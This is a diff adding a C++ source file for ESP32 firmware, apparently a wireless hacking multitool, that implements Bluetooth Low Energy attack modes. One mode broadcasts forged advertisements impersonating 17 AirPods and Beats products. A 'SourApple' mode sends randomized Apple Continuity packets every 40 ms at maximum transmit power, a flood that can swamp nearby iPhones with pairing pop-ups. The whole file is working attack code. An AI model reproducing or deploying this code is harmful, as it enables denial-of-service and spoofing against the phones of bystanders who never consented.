@@ -1,0 +1,171 @@
+#include "BleAdvertiser.h"
+
+#include <NimBLEDevice.h>
+#include <esp_random.h>
+#include <freertos/FreeRTOS.h>
+#include <freertos/task.h>
+
+#include "RadioManager.h"
+#include "../hw/Leds.h"
+
+namespace radio {
+namespace ble_adv {
+
+namespace {
+
+// Apple device advertisement payloads — 17 × 31 bytes each. Ported verbatim
+// from cifertech's bluetooth.cpp BleSpoofer namespace (see reference).
+// Byte 7 differentiates the product (AirPods, AirPods Pro, Beats Solo, …).
+constexpr uint8_t DEVICES[17][31] = {
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0},
+};
+
+const char* SPOOF_NAMES[17] = {
+    "AirPods",           "AirPods Pro",      "AirPods Max",
+    "AirPods Gen 2",     "AirPods Gen 3",    "AirPods Gen 2 (alt)",
+    "PowerBeats",        "PowerBeats Pro",   "Beats Solo Pro",
+    "Beats Buds",        "Beats Flex",       "BeatsX",
+    "Beats Solo3",       "Beats Studio3",    "Beats StudioPro",
+    "Beats FitPro",      "Beats BudsPlus",
+};
+
+Mode         g_mode       = Mode::Off;
+uint8_t      g_spoofIdx   = 0;
+TaskHandle_t g_task       = nullptr;
+uint32_t     g_txCount    = 0;
+bool         g_stopRequested = false;
+
+// Generate a fresh SourApple-style payload in-place (17 bytes). Ported from
+// bluetooth.cpp SourApple::getOAdvertisementData.
+void fillSourApple(uint8_t* packet) {
+    uint8_t i = 0;
+    packet[i++] = 17 - 1;
+    packet[i++] = 0xFF;
+    packet[i++] = 0x4C;
+    packet[i++] = 0x00;
+    packet[i++] = 0x0F;
+    packet[i++] = 0x05;
+    packet[i++] = 0xC1;
+    static const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b,
+                                     0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+    packet[i++] = types[esp_random() % sizeof(types)];
+    esp_fill_random(&packet[i], 3); i += 3;
+    packet[i++] = 0x00;
+    packet[i++] = 0x00;
+    packet[i++] = 0x10;
+    esp_fill_random(&packet[i], 3);
+}
+
+void applyAdvertisementPayload() {
+    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
+    if (!adv) return;
+
+    // Stop before reconfiguring — NimBLE requires this.
+    adv->stop();
+
+    NimBLEAdvertisementData data;
+    if (g_mode == Mode::SourApple) {
+        uint8_t packet[17];
+        fillSourApple(packet);
+        data.addData(packet, 17);
+    } else if (g_mode == Mode::SpoofApple) {
+        data.addData(DEVICES[g_spoofIdx % 17], 31);
+    } else {
+        return;
+    }
+    adv->setAdvertisementData(data);
+    // Fast advertisement interval (0x20 = 20 ms) matches stock firmware.
+    adv->setMinInterval(0x20);
+    adv->setMaxInterval(0x20);
+    adv->start();
+}
+
+void taskEntry(void*) {
+    for (;;) {
+        if (g_stopRequested) break;
+        applyAdvertisementPayload();
+        g_txCount++;
+        static uint32_t lastFlash = 0;
+        uint32_t now = millis();
+        if (now - lastFlash > 80) {
+            leds::signal(leds::Channel::Ble, leds::Event::Tx);
+            lastFlash = now;
+        }
+        // Fast cadence for SourApple (packet must change per advertise).
+        // Slower for Spoofer (consistent name for nearby device UIs).
+        vTaskDelay(pdMS_TO_TICKS(g_mode == Mode::SourApple ? 40 : 500));
+    }
+    // Graceful shutdown
+    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
+    if (adv) adv->stop();
+    g_task = nullptr;
+    vTaskDelete(nullptr);
+}
+
+} // namespace
+
+bool start(Mode m, uint8_t idx) {
+    if (!radio::acquire(radio::Owner::Ble)) return false;
+    if (!NimBLEDevice::isInitialized()) {
+        NimBLEDevice::init("ESP32DIV");
+        NimBLEDevice::setPower(9);   // max TX power (+9 dBm, same as stock)
+    }
+    // Creating a server is what allocates the advertiser.
+    static NimBLEServer* server = nullptr;
+    if (!server) server = NimBLEDevice::createServer();
+
+    if (g_task) {
+        // Already running — just change payload.
+        g_mode     = m;
+        g_spoofIdx = idx;
+        return true;
+    }
+
+    g_mode           = m;
+    g_spoofIdx       = idx;
+    g_txCount        = 0;
+    g_stopRequested  = false;
+
+    xTaskCreatePinnedToCore(taskEntry, "ble_adv", 4096, nullptr,
+                            /*prio=*/1, &g_task, /*coreId=*/1);
+    return true;
+}
+
+void stop() {
+    if (!g_task) { g_mode = Mode::Off; radio::release(radio::Owner::Ble); return; }
+    g_stopRequested = true;
+    // wait briefly for the task to exit
+    for (int i = 0; i < 20 && g_task; ++i) vTaskDelay(pdMS_TO_TICKS(10));
+    g_mode = Mode::Off;
+    radio::release(radio::Owner::Ble);
+}
+
+Mode    currentMode()         { return g_mode; }
+uint8_t currentSpoofIndex()   { return g_spoofIdx; }
+uint32_t txCount()             { return g_txCount; }
+
+void spoofNext() { g_spoofIdx = (uint8_t)((g_spoofIdx + 1) % 17); }
+void spoofPrev() { g_spoofIdx = (uint8_t)((g_spoofIdx + 16) % 17); }
+
+const char* spoofName(uint8_t i) {
+    return (i < 17) ? SPOOF_NAMES[i] : "?";
+}
+
+} // namespace ble_adv
+} // namespace radio
